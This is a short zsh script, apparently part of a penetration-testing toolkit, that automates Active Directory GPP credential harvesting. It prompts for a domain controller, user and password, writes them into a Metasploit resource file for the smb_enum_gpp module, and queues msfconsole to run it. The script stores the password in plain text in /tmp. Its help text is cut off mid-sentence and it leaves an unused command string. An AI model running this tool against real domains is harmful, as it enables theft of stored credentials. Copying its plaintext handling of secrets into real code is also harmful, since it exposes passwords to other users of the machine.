#!/usr/bin/env zsh

############################################################# 
# nb-ad-gpp
#############################################################
nb-ad-gpp-help() {
    cat << "DOC" | bat --plain --language=help

nb-ad-gpp
------------
The nb-ad-gpp namespace contains commands for 

Commands
--------
nb-ad-gpp-install         installs dependencies

DOC
}

nb-ad-gpp-install() {
    __info "Running $0..."
    __pkgs impacket
}

nb-ad-gpp-cme() {
    __check-project
	  __check-domain
	  __ask "Enter the IP address of the target DC server"
	  nb-vars-set-rhost
    __ask "Enter a user account"
    nb-vars-set-user
    __ask "Enter a password for authentication"
    nb-vars-set-pass



    local cmd="use auxiliary/scanner/smb/smb_enum_gpp; set RHOST ; run; exit "

    # Generate a random number for the file name
    rand=$(shuf -i 1000-9999 -n 1)
    rc_file="/tmp/msf_listener_$rand.rc"

    echo "use auxiliary/scanner/smb/smb_enum_gpp" > "$rc_file"
    echo "set RHOST ${__RHOST}" >> "$rc_file"
    echo "set SMBUser ${__USER}" >> "$rc_file"
    echo "set SMBPass ${__PASS}" >> "$rc_file"
    echo "set SMBDomain ${__DOMAIN}" >> "$rc_file"
    echo "exploit" >> "$rc_file"

    print -z "msfconsole -n -q -r \"$rc_file\" "
}